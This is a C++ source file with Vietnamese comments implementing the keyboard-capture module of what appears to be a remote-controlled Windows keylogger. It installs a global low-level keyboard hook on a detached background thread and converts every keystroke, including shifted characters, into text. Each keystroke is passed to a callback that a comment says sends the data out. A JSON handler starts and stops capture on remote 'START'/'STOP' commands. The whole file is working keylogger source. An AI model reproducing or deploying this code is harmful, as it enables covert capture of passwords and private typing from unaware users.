// KeyManager_win.cpp
#include "KeyManager.hpp"
#include <iostream>
#include <vector>

// --- BIẾN TOÀN CỤC (BẮT BUỘC ĐỂ HOOK HOẠT ĐỘNG) ---
static HHOOK g_hHook = NULL;
static KeyCallback g_callback = nullptr; // Hàm callback để gửi dữ liệu ra ngoài

// --- HÀM TIỆN ÍCH: CHUYỂN ĐỔI VK_CODE SANG STRING (CÓ XỬ LÝ SHIFT/CAPS) ---
static std::string ConvertVKCodeToString(DWORD vkCode) {
    // 1. Xử lý các phím đặc biệt để dễ đọc log
    if (vkCode == VK_RETURN) return "[ENTER]\n";
    if (vkCode == VK_BACK)   return "[BACKSPACE]";
    if (vkCode == VK_TAB)    return "[TAB]";
    if (vkCode == VK_SPACE)  return " ";
    if (vkCode == VK_ESCAPE) return "[ESC]";
    if (vkCode >= VK_F1 && vkCode <= VK_F12) return "[F" + std::to_string(vkCode - VK_F1 + 1) + "]";
    if (vkCode == VK_CAPITAL) return "[CAPS]";
    if (vkCode == VK_LCONTROL || vkCode == VK_RCONTROL) return "[CTRL]";
    if (vkCode == VK_LSHIFT || vkCode == VK_RSHIFT) return "[SHIFT]";
    if (vkCode == VK_LMENU || vkCode == VK_RMENU) return "[ALT]"; // VK_MENU là ALT
    
    // Bỏ qua các phím điều hướng (Arrow keys, Insert, Delete, Home, End, PageUp/Down)
    if ((vkCode >= VK_PRIOR && vkCode <= VK_DOWN) || vkCode == VK_INSERT || vkCode == VK_DELETE) return ""; 

    // 2. Lấy trạng thái bàn phím (để biết có đang bật CapsLock hay giữ Shift không)
    std::vector<BYTE> keyState(256);
    // Cần gọi GetKeyboardState trước để ToUnicodeEx hoạt động chính xác
    if (!GetKeyboardState(keyState.data())) return "";

    // 3. Dùng ToUnicodeEx để chuyển đổi chính xác
    WCHAR buffer[16] = {0};
    HKL keyboardLayout = GetKeyboardLayout(0);

    int result = ToUnicodeEx(
        vkCode,
        MapVirtualKey(vkCode, MAPVK_VK_TO_VSC),
        keyState.data(),
        buffer,
        _countof(buffer),
        0,
        keyboardLayout
    );

    // 4. Nếu chuyển đổi thành công -> Chuyển sang UTF-8 string
    if (result > 0) {
        std::wstring ws(buffer);
        int size_needed = WideCharToMultiByte(CP_UTF8, 0, ws.c_str(), (int)ws.size(), NULL, 0, NULL, NULL);
        std::string strTo(size_needed, 0);
        WideCharToMultiByte(CP_UTF8, 0, ws.c_str(), (int)ws.size(), &strTo[0], size_needed, NULL, NULL);
        return strTo;
    }

    return "";
}

// --- HÀM CALLBACK CỦA WINDOWS (HOOK PROCEDURE) ---
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* pKeyBoard = (KBDLLHOOKSTRUCT*)lParam;
        
        // Chuyển đổi mã phím
        std::string keyChar = ConvertVKCodeToString(pKeyBoard->vkCode);
        
        // Nếu có ký tự hợp lệ và đã đăng ký callback -> Gửi đi
        if (!keyChar.empty() && g_callback) {
            g_callback(keyChar);
        }
    }
    // GỌI HÀM TIẾP THEO LÀ BẮT BUỘC!
    return CallNextHookEx(g_hHook, nCode, wParam, lParam);
}

// --- CÁC HÀM CỦA CLASS KEYMANAGER ---

void KeyManager::set_callback(KeyCallback cb) {
    g_callback = cb;
}

void KeyManager::start_hook() {
    if (g_hHook != NULL) return; // Đang chạy rồi thì thôi

    // Hook phải chạy trên thread riêng có Message Loop
    hookThread = std::thread([]() {
        // 1. Cài đặt Hook
        g_hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
        
        if (!g_hHook) {
            std::cerr << "Failed to install keyboard hook" << std::endl;
            return;
        }

        // 2. Vòng lặp tin nhắn (Message Loop) - Bắt buộc để giữ Hook sống
        MSG msg;
        while (GetMessage(&msg, NULL, 0, 0)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }

        // 3. Gỡ Hook khi vòng lặp kết thúc
        UnhookWindowsHookEx(g_hHook);
        g_hHook = NULL;
    });

    hookThread.detach(); // Tách thread ra để chạy ngầm
}

void KeyManager::stop_hook() {
    if (g_hHook) {
        // Gỡ Hook
        UnhookWindowsHookEx(g_hHook);
        g_hHook = NULL;
    }
}

json KeyManager::handle_command(const json& request) {
    std::string command = request.value("command", "");
    
    if (command == "START") {
        start_hook();
        return {{"status", "success"}, {"message", "Keylogger started"}};
    }
    if (command == "STOP") {
        stop_hook();
        return {{"status", "success"}, {"message", "Keylogger stopped"}};
    }

    return {{"status", "error"}, {"message", "Unknown command"}};
}
